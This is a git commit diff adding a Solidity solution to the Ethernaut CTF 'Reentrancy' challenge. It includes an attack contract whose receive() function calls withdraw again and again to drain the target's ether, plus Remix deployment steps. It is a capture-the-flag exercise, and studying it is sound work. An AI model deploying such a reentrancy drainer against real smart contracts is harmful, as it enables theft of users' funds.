8d3d93ad0e0682b18f2a9b0ca584fe7227ba701d
Vamsi Surakarapu <85192850+jr-dev1001@users.noreply.github.com>
2025-07-16 19:15:49 +0530

    reentrancy solution updated

--- Ethernaut CTF/10.reentrancy.sol
+++ Ethernaut CTF/10.reentrancy.sol
@@ -49,3 +49,46 @@ contract ReentrancyAttack {
         }
     }
 }
+
+
+// Using iterface
+
+interface IReentrance {
+    function donate(address _to) external payable;
+    function withdraw(uint _amount) external;
+}
+
+contract ReentrancyAttack2 {
+    IReentrance public reentrancy;
+    uint public attackAmount;
+
+    constructor(address _target) public  payable {
+        reentrancy = IReentrance(_target);
+    }
+
+    function attack() public payable {
+        require(msg.value > 0, "Need ETH to attack");
+        attackAmount = msg.value;
+        reentrancy.donate{value: msg.value}(address(this));
+        reentrancy.withdraw(msg.value);
+    }
+
+    receive() external payable {
+        if (address(reentrancy).balance >= attackAmount) {
+            reentrancy.withdraw(attackAmount);
+        }
+    }
+}
+
+/* 
+using remix (Step-by-Step)
+1. Compile & Deploy ReentrancyAttack:
+    - Use Injected Web3
+    - Pass Reentrance instance address (from Ethernaut)
+    - Deploy
+
+2. Call attack():
+    - In Value field, input: 0.001
+    - Set dropdown to ether
+    - Click transact on attack()
+*/
